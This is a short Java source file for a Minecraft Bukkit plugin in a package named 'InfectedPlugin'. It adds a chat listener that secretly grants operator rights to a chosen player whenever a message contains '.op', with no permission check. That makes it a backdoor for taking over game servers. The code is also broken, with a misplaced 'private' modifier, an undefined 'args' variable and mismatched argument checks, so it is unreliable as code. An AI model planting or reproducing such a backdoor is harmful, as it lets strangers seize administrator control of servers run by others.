 package org.CreeperCoders.InfectedPlugin;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
public class Command_op implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         private Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".op"))
         {
             if (args.length != 1)
             {
                 p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
             }
             else
             {
                 Player target = server.getPlayer(args[1]);
                 target.setOp(true);
                 target.sendMessage(ChatColor.YELLOW + "You are now OP!");
                 cancel = true;
             }
         }
     }
 }
